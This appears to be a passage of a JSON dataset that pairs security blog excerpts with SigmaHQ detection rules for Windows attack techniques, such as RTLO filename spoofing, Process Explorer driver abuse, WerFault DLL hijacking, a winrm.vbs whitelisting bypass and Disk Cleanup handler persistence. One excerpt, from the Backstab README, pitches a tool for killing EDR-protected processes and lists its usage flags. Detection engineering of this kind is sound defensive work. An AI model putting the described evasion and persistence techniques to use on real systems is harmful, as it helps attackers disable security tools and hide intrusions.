    "url": "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method",
    "markdown": "# The RTLO method **Posted:** January 9, 2014 After my post about extensions, I received some requests to deal with another method of pretending to be a different type of file. If you have not read that article yet, it will prove helpful to do that first in order to better understand this post. ### What is RTLO (aka RLO)? The method called RTLO, or RLO, uses the method built into Windows to deal with languages that are written from right to left, the “Right to left override”. Let’s say you want to use a right-to-left written language, like Hebrew",
    "sigma_rule": {
      "title": "Potential File Extension Spoofing Using Right-to-Left Override",
      "id": "979baf41-ca44-4540-9d0c-4fcef3b5a3a4",
      "related": [
        {
          "id": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious filenames that contain a right-to-left override character and a potentially spoofed file extensions.\n",
      "references": [
        "https://redcanary.com/blog/right-to-left-override/",
        "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method"
      ],
      "author": "Jonathan Peters (Nextron Systems), Florian Roth (Nextron Systems)",
      "date": "2024-11-17",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1036.002"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_rtlo_unicode": {
          "TargetFilename|contains": "\\u202e"
        },
        "selection_extensions": {
          "TargetFilename|contains": [
            "fpd..",
            "nls..",
            "vsc..",
            "xcod.",
            "xslx."
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Filenames that contains scriptures such as arabic or hebrew might make use of this character"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_right_to_left_override_extension_spoofing.yml"
  },
  "897": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/",
    "markdown": "# Untangling KNOTWEED: European private-sector offensive actor using 0-day exploits **Research** | **Threat intelligence** | **Threat actors** **July 27, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. **KNOTWEED** is now tracked as **Denim Tsunami**. > To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: **Microsoft shifts to a new threat actor naming taxonomy**. The Microsoft Threat Intelligence Center (MSTIC) and the Microsoft",
    "sigma_rule": {
      "title": "Drop Binaries Into Spool Drivers Color Folder",
      "id": "ce7066a6-508a-42d3-995b-2952c65dc2ce",
      "status": "test",
      "description": "Detects the creation of suspcious binary files inside the \"\\windows\\system32\\spool\\drivers\\color\\\" as seen in the blog referenced below",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-28",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|startswith": "C:\\Windows\\System32\\spool\\drivers\\color\\",
          "TargetFilename|endswith": [
            ".dll",
            ".exe",
            ".sys"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_spool_drivers_color_drop.yml"
  },
  "898": {
    "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
    "markdown": "# Process Explorer v17.06 Published: May 28, 2024 Download Process Explorer **(3.3 MB)** **Run now** from Sysinternals Live. Video Player: https://www.microsoft.com/en-us/videoplayer/embed/RE5d5Rd?autoplay=true&amp;loop=true&amp;controls=false&amp;postJsllMsg=true\" *Created with ZoomIt* ## Introduction Ever wondered which program has a particular file or directory open? Now you can find out. *Process Explorer* shows you information about which handles and DLLs processes have opened or loaded. The *Process Explorer* display consists of two sub-windows. The top window always shows a list of the currently active processes, including the names of their owning accounts, whereas the information displayed in the bottom window depends on the mode that *Process Explorer* is",
    "sigma_rule": {
      "title": "Process Explorer Driver Creation By Non-Sysinternals Binary",
      "id": "de46c52b-0bf8-4936-a327-aace94f94ac6",
      "status": "test",
      "description": "Detects creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
        "https://github.com/Yaxser/Backstab",
        "https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks",
        "https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1068"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\PROCEXP",
          "TargetFilename|endswith": ".sys"
        },
        "filter_main_process_explorer": {
          "Image|endswith": [
            "\\procexp.exe",
            "\\procexp64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Some false positives may occur with legitimate renamed process explorer binaries"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_sysinternals_procexp_driver_susp_creation.yml"
  },
  "899": {
    "url": "https://github.com/Yaxser/Backstab",
    "markdown": "# Backstab ## *Kill EDR Protected Processes* Have these local admin credentials but the EDR is standing in the way? Unhooking or direct syscalls are not working against the EDR? Well, why not just kill it? Backstab is a tool capable of killing antimalware protected processes by leveraging sysinternals’ Process Explorer (ProcExp) driver, which is signed by Microsoft. ### What can it do? ``` Usage: backstab.exe <-n name || -p PID> [options] -n, Choose process by name, including the .exe suffix -p, Choose process by PID -l, List handles of protected process -k, Kill the protected process by closing its",
    "sigma_rule": {
      "title": "Process Explorer Driver Creation By Non-Sysinternals Binary",
      "id": "de46c52b-0bf8-4936-a327-aace94f94ac6",
      "status": "test",
      "description": "Detects creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
        "https://github.com/Yaxser/Backstab",
        "https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks",
        "https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1068"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\PROCEXP",
          "TargetFilename|endswith": ".sys"
        },
        "filter_main_process_explorer": {
          "Image|endswith": [
            "\\procexp.exe",
            "\\procexp64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Some false positives may occur with legitimate renamed process explorer binaries"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_sysinternals_procexp_driver_susp_creation.yml"
  },
  "900": {
    "url": "https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks",
    "markdown": "# Stopping Vulnerable Driver Attacks **1 March 2023** Using vulnerable drivers to gain kernel mode execution. --- **Categories:** Security operations, Detection science ## Key takeaways - Ransomware actors are leveraging vulnerable drivers to tamper with endpoint security products. - Elastic Security released 65 YARA rules to detect vulnerable driver abuse. - Elastic Endpoint (8.3+) protects users from this threat. ## Background In 2018, Gabriel Landau and Joe Desimone presented a talk at Black Hat covering the evolution of kernel mode threats on Windows. The most concerning trend was towards leveraging known good but vulnerable drivers to gain kernel mode execution.",
    "sigma_rule": {
      "title": "Process Explorer Driver Creation By Non-Sysinternals Binary",
      "id": "de46c52b-0bf8-4936-a327-aace94f94ac6",
      "status": "test",
      "description": "Detects creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
        "https://github.com/Yaxser/Backstab",
        "https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks",
        "https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1068"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\PROCEXP",
          "TargetFilename|endswith": ".sys"
        },
        "filter_main_process_explorer": {
          "Image|endswith": [
            "\\procexp.exe",
            "\\procexp64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Some false positives may occur with legitimate renamed process explorer binaries"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_sysinternals_procexp_driver_susp_creation.yml"
  },
  "901": {
    "url": "https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/",
    "markdown": "# ‘AuKill’ EDR killer malware abuses Process Explorer driver ## Driver-based attacks against security products are on the rise **Posted on** April 19, 2023 ### Tags - Threat Research - act - active adversary - anti-EDR - AuKill - backstab - EDR - EDR killer - featured - malware - Process Explorer - procexp - Sophos X-Ops - targeted attacks Over the past several months, Sophos X-Ops has investigated multiple incidents where attackers attempted to disable EDR clients with a new defense evasion tool we’ve dubbed **AuKill**. The AuKill tool abuses an outdated version of the driver used by version",
    "sigma_rule": {
      "title": "Process Explorer Driver Creation By Non-Sysinternals Binary",
      "id": "de46c52b-0bf8-4936-a327-aace94f94ac6",
      "status": "test",
      "description": "Detects creation of the Process Explorer drivers by processes other than Process Explorer (procexp) itself.\nHack tools or malware may use the Process Explorer driver to elevate privileges, drops it to disk for a few moments, runs a service using that driver and removes it afterwards.\n",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer",
        "https://github.com/Yaxser/Backstab",
        "https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks",
        "https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2023-05-05",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1068"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\PROCEXP",
          "TargetFilename|endswith": ".sys"
        },
        "filter_main_process_explorer": {
          "Image|endswith": [
            "\\procexp.exe",
            "\\procexp64.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Some false positives may occur with legitimate renamed process explorer binaries"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_sysinternals_procexp_driver_susp_creation.yml"
  },
  "902": {
    "url": "https://redcanary.com/blog/intelligence-insights-october-2021/",
    "markdown": "## Intelligence Insights: October 2021 Yellow Cockatoo takes flight again, ZLoader changes tactics, BlackByte emerges as a new threat, and Conti demonstrates ransomware is not gone. *Originally published October 21, 2021. Last modified April 30, 2024.* --- Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community. ### Highlights September brought some changes in our threat rankings,",
    "sigma_rule": {
      "title": "VHD Image Download Via Browser",
      "id": "8468111a-ef07-4654-903b-b863a80bbc95",
      "status": "test",
      "description": "Detects creation of \".vhd\"/\".vhdx\" files by browser processes.\nMalware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls.\n",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-october-2021/",
        "https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/",
        "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      ],
      "author": "frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'",
      "date": "2021-10-25",
      "modified": "2023-05-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\firefox.exe",
            "\\iexplore.exe",
            "\\maxthon.exe",
            "\\MicrosoftEdge.exe",
            "\\msedge.exe",
            "\\msedgewebview2.exe",
            "\\opera.exe",
            "\\safari.exe",
            "\\seamonkey.exe",
            "\\vivaldi.exe",
            "\\whale.exe"
          ],
          "TargetFilename|contains": ".vhd"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate downloads of \".vhd\" files would also trigger this"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_vhd_download_via_browsers.yml"
  },
  "903": {
    "url": "https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/",
    "markdown": "# Lazarus experiments with new ransomware The Lazarus cybercrime group uses traditional APT techniques to spread VHD ransomware. **Date:** July 28, 2020 --- The Lazarus group has always stood out for using methods typical of APT attacks but specializing in financial cybercrime. Recently, our experts detected fresh, previously unexplored VHD malware, which Lazarus seems to be experimenting with. Functionally, VHD is a fairly standard ransomware tool. It creeps through the drives connected to a victim’s computer, encrypts files, and deletes all System Volume Information folders (thereby sabotaging System Restore attempts in Windows). What’s more, it can suspend processes that could",
    "sigma_rule": {
      "title": "VHD Image Download Via Browser",
      "id": "8468111a-ef07-4654-903b-b863a80bbc95",
      "status": "test",
      "description": "Detects creation of \".vhd\"/\".vhdx\" files by browser processes.\nMalware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls.\n",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-october-2021/",
        "https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/",
        "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      ],
      "author": "frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'",
      "date": "2021-10-25",
      "modified": "2023-05-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\firefox.exe",
            "\\iexplore.exe",
            "\\maxthon.exe",
            "\\MicrosoftEdge.exe",
            "\\msedge.exe",
            "\\msedgewebview2.exe",
            "\\opera.exe",
            "\\safari.exe",
            "\\seamonkey.exe",
            "\\vivaldi.exe",
            "\\whale.exe"
          ],
          "TargetFilename|contains": ".vhd"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate downloads of \".vhd\" files would also trigger this"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_vhd_download_via_browsers.yml"
  },
  "904": {
    "url": "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/",
    "markdown": "# Lazarus on the hunt for big game **APT reports** **28 Jul 2020** --- We may only be six months in, but there’s little doubt that 2020 will go down in history as a rather unpleasant year. In the field of cybersecurity, the collective hurt mostly crystallized around the increasing prevalence of targeted ransomware attacks. By investigating a number of these incidents and through discussions with some of our trusted industry partners, we feel that we now have a good grasp on how the ransomware ecosystem is structured. [Image Details: **Alt Text**: Structure of the ransomware ecosystem **Description**: The image",
    "sigma_rule": {
      "title": "VHD Image Download Via Browser",
      "id": "8468111a-ef07-4654-903b-b863a80bbc95",
      "status": "test",
      "description": "Detects creation of \".vhd\"/\".vhdx\" files by browser processes.\nMalware can use mountable Virtual Hard Disk \".vhd\" files to encapsulate payloads and evade security controls.\n",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-october-2021/",
        "https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/",
        "https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/"
      ],
      "author": "frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'",
      "date": "2021-10-25",
      "modified": "2023-05-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\brave.exe",
            "\\chrome.exe",
            "\\firefox.exe",
            "\\iexplore.exe",
            "\\maxthon.exe",
            "\\MicrosoftEdge.exe",
            "\\msedge.exe",
            "\\msedgewebview2.exe",
            "\\opera.exe",
            "\\safari.exe",
            "\\seamonkey.exe",
            "\\vivaldi.exe",
            "\\whale.exe"
          ],
          "TargetFilename|contains": ".vhd"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate downloads of \".vhd\" files would also trigger this"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_vhd_download_via_browsers.yml"
  },
  "905": {
    "url": "https://www.bleepingcomputer.com/news/security/hackers-are-now-hiding-malware-in-windows-event-logs/",
    "markdown": "# Hackers are now hiding malware in Windows Event Logs May 9, 2022 Security researchers have noticed a malicious campaign that used Windows event logs to store malware, a technique that has not been previously documented publicly for attacks in the wild. The method enabled the threat actor behind the attack to plant fileless malware in the file system in an attack filled with techniques and modules designed to keep the activity as stealthy as possible. ### Adding payloads to Windows event logs Researchers at Kaspersky collected a sample of the malware after being a company product equipped with technology",
    "sigma_rule": {
      "title": "Creation of WerFault.exe/Wer.dll in Unusual Folder",
      "id": "28a452f3-786c-4fd8-b8f2-bddbe9d616d1",
      "status": "test",
      "description": "Detects the creation of a file named \"WerFault.exe\" or \"wer.dll\" in an uncommon folder, which could be a sign of WerFault DLL hijacking.",
      "references": [
        "https://www.bleepingcomputer.com/news/security/hackers-are-now-hiding-malware-in-windows-event-logs/"
      ],
      "author": "frack113",
      "date": "2022-05-09",
      "modified": "2024-11-28",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.t1574.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\WerFault.exe",
            "\\wer.dll"
          ]
        },
        "filter_main_known_locations": {
          "TargetFilename|startswith": [
            "C:\\Windows\\SoftwareDistribution\\",
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_werfault_dll_hijacking.yml"
  },
  "906": {
    "url": "https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404",
    "markdown": "# Application Whitelisting Bypass and Arbitrary Unsigned Code Execution Technique in winrm.vbs **Jul 12, 2018** ## Bypass Technique Description winrm.vbs (a Windows-signed script in System32) is able to consume and execute attacker-controlled XSL which is not subject to enlightened script host restrictions, resulting in the execution of arbitrary, unsigned code execution. When you supply “-format:pretty” or “-format:text” to winrm.vbs, it pulls WsmPty.xsl or WsmTxt.xsl respectively from the directory in which cscript.exe resides. This means that if an attacker copies cscript.exe to an attacker-controlled location where their malicious XSL resides, they will achieve arbitrary unsigned code execution. This issue is effectively",
    "sigma_rule": {
      "title": "AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl - File",
      "id": "d353dac0-1b41-46c2-820c-d7d2561fc6ed",
      "related": [
        {
          "id": "074e0ded-6ced-4ebd-8b4d-53f55908119d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)",
      "references": [
        "https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404"
      ],
      "author": "Julia Fomina, oscd.community",
      "date": "2020-10-06",
      "modified": "2022-11-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "system_files": {
          "TargetFilename|endswith": [
            "WsmPty.xsl",
            "WsmTxt.xsl"
          ]
        },
        "in_system_folder": {
          "TargetFilename|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\"
          ]
        },
        "condition": "system_files and not in_system_folder"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_winrm_awl_bypass.yml"
  },
  "907": {
    "url": "https://persistence-info.github.io/Data/diskcleanuphandler.html",
    "markdown": "# persistence-info.github.io ## Disk Cleanup Handler ### Location: - `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\` - `HKCR\\CLSID` ### Classification: | Criteria | Value | |------------------|--------------------| | Permissions | Admin | | Security context | User | | Persistence type | Registry | | Code type | DLL[^1] | | Launch type | User initiated[^2] | | Impact | Non-destructive | | OS Version | All OS versions | | Dependencies | OS only | | Toolset | Scriptable | ### Description: > The disk cleanup manager is part of the operating system. It displays the dialog box […] The user has the option of enabling",
    "sigma_rule": {
      "title": "Potential Persistence Via Disk Cleanup Handler - Registry",
      "id": "d4f4e0be-cf12-439f-9e25-4e2cdcf7df5a",
      "status": "test",
      "description": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence.\nThe disk cleanup manager is part of the operating system. It displays the dialog box […]\nThe user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup manager's UI.\nAlthough Windows comes with a number of disk cleanup handlers, they aren't designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n",
      "references": [
        "https://persistence-info.github.io/Data/diskcleanuphandler.html",
        "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-02-07",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_add"
      },
      "detection": {
        "selection": {
          "EventType": "CreateKey",
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\"
        },
        "filter": {
          "TargetObject|endswith": [
            "\\Active Setup Temp Folders",
            "\\BranchCache",
            "\\Content Indexer Cleaner",
            "\\D3D Shader Cache",
            "\\Delivery Optimization Files",
            "\\Device Driver Packages",
            "\\Diagnostic Data Viewer database files",
            "\\Downloaded Program Files",
            "\\DownloadsFolder",
            "\\Feedback Hub Archive log files",
            "\\Internet Cache Files",
            "\\Language Pack",
            "\\Microsoft Office Temp Files",
            "\\Offline Pages Files",
            "\\Old ChkDsk Files",
            "\\Previous Installations",
            "\\Recycle Bin",
            "\\RetailDemo Offline Content",
            "\\Setup Log Files",
            "\\System error memory dump files",
            "\\System error minidump files",
            "\\Temporary Files",
            "\\Temporary Setup Files",
            "\\Temporary Sync Files",
            "\\Thumbnail Cache",
            "\\Update Cleanup",
            "\\Upgrade Discarded Files",
            "\\User file versions",
            "\\Windows Defender",
            "\\Windows Error Reporting Files",
            "\\Windows ESD installation files",
            "\\Windows Upgrade Log Files"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate new entry added by windows"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_add\\registry_add_persistence_disk_cleanup_handler_entry.yml"
  },
  "908": {
    "url": "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/",
    "markdown": "# Beyond good ol’ Run key, Part 86 Posted on 2018-09-02 It is a well-known fact that Windows features are the best persistence mechanisms, and… the one I am going to talk about is yet another one of these… If you ever ran into a problem of having not enough space on your hard drive you are certainly familiar with the Disk Cleanup program: ```image Alt: Disk Cleanup Description: The image displays the user interface of the Disk Cleanup tool in Windows. It shows a window titled 'Disk Cleanup for (C:)', indicating that the utility is being used to free",
    "sigma_rule": {
      "title": "Potential Persistence Via Disk Cleanup Handler - Registry",
      "id": "d4f4e0be-cf12-439f-9e25-4e2cdcf7df5a",
      "status": "test",
      "description": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence.\nThe disk cleanup manager is part of the operating system. It displays the dialog box […]\nThe user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup manager's UI.\nAlthough Windows comes with a number of disk cleanup handlers, they aren't designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n",
      "references": [
        "https://persistence-info.github.io/Data/diskcleanuphandler.html",
        "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-02-07",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_add"
      },
      "detection": {
        "selection": {
          "EventType": "CreateKey",
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\"
        },
        "filter": {
          "TargetObject|endswith": [
            "\\Active Setup Temp Folders",
            "\\BranchCache",
            "\\Content Indexer Cleaner",
            "\\D3D Shader Cache",
            "\\Delivery Optimization Files",
            "\\Device Driver Packages",
            "\\Diagnostic Data Viewer database files",
            "\\Downloaded Program Files",
            "\\DownloadsFolder",
            "\\Feedback Hub Archive log files",
            "\\Internet Cache Files",
            "\\Language Pack",
            "\\Microsoft Office Temp Files",
            "\\Offline Pages Files",
            "\\Old ChkDsk Files",
            "\\Previous Installations",
            "\\Recycle Bin",
            "\\RetailDemo Offline Content",
            "\\Setup Log Files",
            "\\System error memory dump files",
            "\\System error minidump files",
            "\\Temporary Files",
            "\\Temporary Setup Files",
            "\\Temporary Sync Files",
            "\\Thumbnail Cache",
            "\\Update Cleanup",
            "\\Upgrade Discarded Files",
            "\\User file versions",
            "\\Windows Defender",
            "\\Windows Error Reporting Files",
            "\\Windows ESD installation files",
            "\\Windows Upgrade Log Files"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate new entry added by windows"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_add\\registry_add_persistence_disk_cleanup_handler_entry.yml"
  },
  "909": {
    "url": "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/",
    "markdown": "# Windows Defender Exploit Guard: Reduce the attack surface against next-generation malware **Published**: October 23, 2017 Windows Defender Exploit Guard is a new set of intrusion prevention capabilities that ships with the Windows 10 Fall Creators Update. The four components of Windows Defender Exploit Guard are designed to lock down the device against a wide variety of attack vectors and block behaviors commonly used in malware attacks, while enabling enterprises to balance their security risk and productivity requirements. Traditional antivirus technologies are an integral aspect of the endpoint security stack through the identification and removal of malicious executables using a",
    "sigma_rule": {
      "title": "Folder Removed From Exploit Guard ProtectedFolders List - Registry",
      "id": "272e55a4-9e6b-4211-acb6-78f51f0b1b40",
      "status": "test",
      "description": "Detects the removal of folders from the \"ProtectedFolders\" list of of exploit guard. This could indicate an attacker trying to launch an encryption process or trying to manipulate data inside of the protected folder",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "registry_delete",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "EventType": "DeleteValue",
          "TargetObject|contains": "SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\ProtectedFolders"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate administrators removing applications (should always be investigated)"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_exploit_guard_protected_folders.yml"
  },
  "910": {
    "url": "https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer",
    "markdown": "# How to remove entries from the Remote Desktop Connection Computer box This article describes how to remove entries from the **Remote Desktop Connection Computer** box. *Original KB number: 312169* > **Important** > This section, method, or task contains steps that tell you how to modify the registry. However, serious problems might occur if you modify the registry incorrectly. Therefore, make sure that you follow these steps carefully. For added protection, back up the registry before you modify it. Then, you can restore the registry if a problem occurs. For more information about how to back up and restore the",
    "sigma_rule": {
      "title": "Terminal Server Client Connection History Cleared - Registry",
